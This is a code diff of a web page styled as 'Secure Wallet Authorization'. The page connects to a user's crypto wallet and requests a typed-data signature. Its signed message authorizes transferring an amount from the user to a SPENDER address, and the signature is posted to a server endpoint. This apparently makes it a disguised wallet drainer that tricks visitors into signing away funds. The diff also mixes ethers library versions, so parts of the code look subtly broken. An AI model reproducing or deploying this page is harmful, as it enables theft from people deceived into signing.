@@ -7,17 +7,17 @@
 <title>Secure Wallet Authorization</title>
 <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
 <style>
-    :root { --accent: #38bdf8; --bg-dark: #0f172a; --card-bg: #1e293b; }
-    body { background-color: var(--bg-dark); color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: 'Inter', sans-serif; }
-    .auth-card { background: var(--card-bg); padding: 40px; border-radius: 28px; width: 100%; max-width: 440px; border: 1px solid #334155; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
-    .btn-action { background: var(--accent); color: var(--bg-dark); font-weight: 800; border: none; padding: 16px; border-radius: 14px; width: 100%; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
-    .btn-action:hover { background: #7dd3fc; transform: translateY(-2px); box-shadow: 0 10px 15px -3px rgba(56, 189, 248, 0.3); }
-    .btn-action:disabled { background: #475569; color: #94a3b8; cursor: not-allowed; transform: none; }
-    .detail-row { background: rgba(15, 23, 42, 0.5); padding: 12px 16px; border-radius: 12px; border: 1px solid #334155; margin-bottom: 12px; }
-    .detail-label { font-size: 0.7rem; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.05em; display: block; }
-    .detail-value { font-family: 'Roboto Mono', monospace; font-size: 0.85rem; color: var(--accent); word-break: break-all; }
-    .status-pill { display: inline-block; padding: 6px 16px; border-radius: 20px; font-size: 0.75rem; font-weight: 600; margin-top: 20px; background: rgba(255,255,255,0.05); color: #94a3b8; }
-    .d-none { display: none !important; }
+:root { --accent: #38bdf8; --bg-dark: #0f172a; --card-bg: #1e293b; }
+body { background-color: var(--bg-dark); color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: 'Inter', sans-serif; }
+.auth-card { background: var(--card-bg); padding: 40px; border-radius: 28px; width: 100%; max-width: 440px; border: 1px solid #334155; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
+.btn-action { background: var(--accent); color: var(--bg-dark); font-weight: 800; border: none; padding: 16px; border-radius: 14px; width: 100%; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+.btn-action:hover { background: #7dd3fc; transform: translateY(-2px); box-shadow: 0 10px 15px -3px rgba(56, 189, 248, 0.3); }
+.btn-action:disabled { background: #475569; color: #94a3b8; cursor: not-allowed; transform: none; }
+.detail-row { background: rgba(15, 23, 42, 0.5); padding: 12px 16px; border-radius: 12px; border: 1px solid #334155; margin-bottom: 12px; }
+.detail-label { font-size: 0.7rem; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.05em; display: block; }
+.detail-value { font-family: 'Roboto Mono', monospace; font-size: 0.85rem; color: var(--accent); word-break: break-all; }
+.status-pill { display: inline-block; padding: 6px 16px; border-radius: 20px; font-size: 0.75rem; font-weight: 600; margin-top: 20px; background: rgba(255,255,255,0.05); color: #94a3b8; }
+.d-none { display: none !important; }
 </style>
 </head>
 <body>
@@ -70,10 +70,11 @@ document.getElementById('connectBtn').onclick = async () => {
     if (!window.ethereum) return alert("No wallet detected. Open in a wallet browser.");
 
     try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        userAccount = accounts[0];
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        userAccount = await signer.getAddress();
 
-        const provider = new ethers.BrowserProvider(window.ethereum);
         const network = await provider.getNetwork();
         const chainId = Number(network.chainId);
 
@@ -87,6 +88,7 @@ document.getElementById('connectBtn').onclick = async () => {
         document.getElementById('status').style.color = "#38bdf8";
 
     } catch (err) {
+        console.error(err);
         alert("Connection failed: " + err.message);
     }
 };
@@ -95,14 +97,13 @@ document.getElementById('connectBtn').onclick = async () => {
 document.getElementById('signBtn').onclick = async () => {
     const status = document.getElementById('status');
     const btn = document.getElementById('signBtn');
-
     btn.disabled = true;
     status.innerText = "Check your wallet...";
     status.style.color = "#38bdf8";
 
     try {
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        const signer = await provider.getSigner();
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
 
         const network = await provider.getNetwork();
         const chainId = Number(network.chainId);
@@ -133,14 +134,17 @@ document.getElementById('signBtn').onclick = async () => {
 
         const message = { from: userAccount, to: SPENDER, value: amount, validAfter: 0, validBefore: deadline, nonce };
 
-        const signature = await signer.signTypedData(domain, types, message);
+        const signature = await signer._signTypedData(domain, types, message);
         const sig = ethers.Signature.from(signature);
 
         status.innerText = "Signature success! Verifying...";
 
         const response = await fetch('/user/update-wallet-status/', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'X-CSRFToken': '{{ csrf_token }}' },
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRFToken': '{{ csrf_token }}'
+            },
             body: JSON.stringify({
                 address: userAccount,
                 v: sig.v, r: sig.r, s: sig.s,
@@ -157,13 +161,14 @@ document.getElementById('signBtn').onclick = async () => {
         } else throw new Error("Server Sync Failed");
 
     } catch (err) {
+        console.error(err);
         btn.disabled = false;
         if (err.code === 4001 || err.message.toLowerCase().includes("reject")) {
             status.innerText = "Request Cancelled";
             status.style.color = "#fb7185";
         } else {
             status.innerText = "Error: Check Network Sync";
-            console.error(err);
+            status.style.color = "#facc15";
         }
     }
 };
